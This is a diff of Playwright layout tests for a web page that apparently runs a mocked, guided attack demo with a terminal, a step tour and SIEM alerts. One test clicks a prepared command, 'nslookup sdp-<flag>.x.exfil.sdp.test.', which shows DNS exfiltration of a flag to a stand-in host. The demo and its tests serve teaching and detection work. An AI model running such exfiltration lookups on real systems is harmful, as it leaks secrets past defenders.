@@ -337,15 +337,17 @@ test.describe("layout (ADR 0035, amended 2026-10-05; ?mock=1)", () => {
     await page.evaluate(() => document.getElementById("attack")?.scrollIntoView({ behavior: "instant" }));
     await page.waitForTimeout(200);
     if (isMobile) await bar.getByRole("button", { name: "Show the steps" }).click();
-    // A click is the visitor's (Playwright scrolls a target into view to press it): scrollY is read
-    // right after each press, and must not change while the page answers.
+    // A click is the visitor's (Playwright scrolls a target into view to press it; a step's button
+    // takes them to the terminal): scrollY is read once the page has answered the press, and must not
+    // change while the page goes on answering.
     const y = () => page.evaluate(() => scrollY);
     await tour.locator('.tour__step[data-current="true"] .tour__btn').click();
-    let y0 = await y();
-    expect(y0).toBeGreaterThan(100);
     await expect(term.locator("#term-input")).toHaveValue("id");
     await expect(term.locator("#term-input")).toBeEnabled({ timeout: 10_000 });
-    expect(await y()).toBe(y0);
+    await expect(term.locator(".term__grid")).toBeInViewport();
+    await page.waitForTimeout(700);
+    let y0 = await y();
+    expect(y0).toBeGreaterThan(100);
     await term.locator("#term-input").press("Enter");
     await expect(tour.locator('.tour__step[data-done="true"]')).toHaveCount(1);
     await expect(term.locator("#term-input")).toBeEnabled({ timeout: 10_000 });
@@ -404,7 +406,52 @@ test.describe("layout (ADR 0035, amended 2026-10-05; ?mock=1)", () => {
     expect(problems).toEqual([]);
   });
 
-  test("at 1440x900 the tour is a panel beside the terminal that stays in view (sticky) through the attack section", async ({ page, isMobile }) => {
+  test("on a wide screen the attack section widens: the terminal and This run left, the tour's rail right, the commands across both; the sticky panel is never cut at its top", async ({ page, isMobile }) => {
+    test.skip(isMobile, "the wide layout is a desktop layout");
+    for (const [width, height] of [
+      [1920, 1080],
+      [2560, 1440],
+    ]) {
+      await page.setViewportSize({ width, height });
+      await page.goto("/?mock=1&mock-speed=0.3&mock-siem-delay=3000");
+      const term = page.locator("#terminal");
+      await term.getByRole("button", { name: /Open the terminal/ }).click();
+      await expect(term.locator("#term-input")).toBeEnabled({ timeout: 10_000 });
+      await term.getByRole("button", { name: "nslookup sdp-<flag>.x.exfil.sdp.test." }).click();
+      await expect(page.locator("#tour-steps .tour__notice--siem")).toHaveCount(1, { timeout: 20_000 });
+      const m = await page.evaluate(() => {
+        const r = (sel: string) => document.querySelector(sel)!.getBoundingClientRect();
+        return { wrap: r("#attack > .wrap"), grid: r(".term__grid"), side: r(".term__side"), out: r(".term__out"), tour: r("#tour .tour"), palette: r(".term__palette"), stage: r(".attack-stage"), vw: innerWidth };
+      });
+      expect(m.wrap.width).toBeGreaterThan(1300);
+      expect(m.wrap.width).toBeLessThanOrEqual(1600);
+      expect(m.tour.left).toBeGreaterThanOrEqual(m.grid.right);
+      expect(m.side.width).toBeGreaterThanOrEqual(300);
+      expect(m.out.width).toBeGreaterThanOrEqual(600);
+      // The commands run the whole stage, under both columns.
+      expect(Math.abs(m.palette.width - m.stage.width)).toBeLessThan(2);
+      expect(m.palette.top).toBeGreaterThanOrEqual(m.grid.bottom);
+      // The output is no taller than "This run" makes the row: no empty box.
+      expect(m.out.height).toBeLessThanOrEqual(m.side.height + 2);
+      // Scrolled into the session, the panel stays whole: nothing of it scrolled away inside, its
+      // top under the header while its row has room, with the row (never past it) otherwise.
+      await page.evaluate(() => document.querySelector(".term__grid")?.scrollIntoView({ behavior: "instant" }));
+      await page.evaluate(() => scrollBy(0, 120));
+      await page.waitForTimeout(100);
+      const p = await page.evaluate(() => {
+        const tour = document.querySelector("#tour .tour") as HTMLElement;
+        const first = tour.firstElementChild as HTMLElement;
+        return { top: tour.getBoundingClientRect().top, row: document.querySelector(".term__grid")!.getBoundingClientRect().top, header: document.querySelector(".site-header")!.getBoundingClientRect().bottom, scrollTop: tour.scrollTop, firstTop: first.getBoundingClientRect().top, bottom: tour.getBoundingClientRect().bottom, vh: innerHeight };
+      });
+      expect(p.top).toBeGreaterThanOrEqual(Math.min(p.header, p.row));
+      expect(p.scrollTop).toBe(0);
+      expect(p.firstTop).toBeGreaterThanOrEqual(p.top - 1);
+      expect(p.bottom).toBeLessThanOrEqual(p.vh + 1);
+      await noHorizontalScroll(page);
+    }
+  });
+
+  test("at 1440x900 the tour is a panel beside the terminal, whole: under the header while its row has room, with the row otherwise, never scrolled inside", async ({ page, isMobile }) => {
     test.skip(isMobile, "the side panel is a wide-screen layout");
     await page.setViewportSize({ width: 1440, height: 900 });
     await page.goto("/?mock=1&mock-speed=0.3");
@@ -418,7 +465,7 @@ test.describe("layout (ADR 0035, amended 2026-10-05; ?mock=1)", () => {
     const rects = () =>
       page.evaluate(() => {
         const r = (sel: string) => document.querySelector(sel)!.getBoundingClientRect();
-        return { tour: r("#tour .tour"), wrap: r("#tour"), term: r("#terminal"), termWrap: r(".terminal-wrap"), header: r(".site-header"), vh: innerHeight };
+        return { tour: r("#tour .tour"), wrap: r("#tour"), term: r("#terminal .term__grid"), termWrap: r("#terminal .term__grid"), header: r(".site-header"), vh: innerHeight };
       });
     await page.evaluate(() => document.getElementById("terminal")?.scrollIntoView({ behavior: "instant" }));
     let m = await rects();
@@ -426,21 +473,18 @@ test.describe("layout (ADR 0035, amended 2026-10-05; ?mock=1)", () => {
     expect(m.tour.left).toBeGreaterThanOrEqual(m.term.right);
     expect(Math.abs(m.wrap.top - m.termWrap.top)).toBeLessThan(2);
     expect(m.term.width).toBeGreaterThan(700);
-    // Scrolled down through the session, the panel stays below the header and inside the viewport,
-    // as long as the terminal goes on below the fold.
-    let steps = 0;
-    for (;;) {
-      await page.evaluate(() => scrollBy(0, 100));
+    // The row is the output's height (capped), so the panel and the terminal show together: scrolled
+    // on through the section, the panel keeps under the header while its row has room, then goes with
+    // the row (as "This run" does); nothing of it is ever scrolled away inside it.
+    expect(m.tour.bottom).toBeLessThanOrEqual(m.term.bottom + 1);
+    for (let i = 0; i < 4; i++) {
+      await page.evaluate(() => scrollBy(0, 150));
       await page.waitForTimeout(100);
       m = await rects();
-      if (m.term.bottom < m.vh) break;
-      steps++;
-      expect(m.tour.top).toBeGreaterThanOrEqual(m.header.bottom);
-      expect(m.tour.top).toBeLessThan(m.vh / 2);
-      expect(m.tour.bottom).toBeLessThanOrEqual(m.vh + 1);
-      await expect(page.locator("#tour .tour")).toBeInViewport();
+      expect(m.tour.top).toBeGreaterThanOrEqual(Math.min(m.header.bottom, m.term.top));
+      expect(m.tour.bottom).toBeLessThanOrEqual(m.term.bottom + 1);
+      expect(await page.locator("#tour .tour").evaluate((el) => el.scrollTop)).toBe(0);
     }
-    expect(steps).toBeGreaterThanOrEqual(3);
   });
 
   test("on a first visit everything below the attack folds; the attack and the hero diagram stay open", async ({ page }) => {
